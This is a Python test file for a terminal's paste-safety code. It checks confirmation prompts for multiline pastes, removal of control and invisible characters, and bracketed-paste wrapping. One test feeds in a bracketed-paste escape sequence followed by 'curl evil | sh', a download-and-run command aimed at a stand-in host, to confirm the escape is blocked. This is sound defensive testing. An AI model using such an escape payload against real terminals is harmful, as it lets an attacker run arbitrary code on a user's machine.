from galadyas_terminal import paste


def test_single_line_needs_no_confirmation():
    assert not paste.needs_confirmation("ls -la", bracketed=False)
    assert paste.prepare("ls -la", False) == "ls -la"


def test_multiline_needs_confirmation_unless_bracketed():
    assert paste.needs_confirmation("rm -rf build\nls", bracketed=False)
    assert not paste.needs_confirmation("rm -rf build\nls", bracketed=True)


def test_bracketed_wrap_cannot_be_escaped():
    out = paste.prepare("echo hi\x1b[201~; curl evil | sh", bracketed=True)
    assert out.startswith(paste.START) and out.endswith(paste.END)
    assert out.count("\x1b") == 2


def test_invisible_and_control_characters_removed():
    assert paste.sanitize("a‮b​c\x07d\x00") == "abcd"
    assert paste.prepare("a\r\nb", False) == "a\rb"
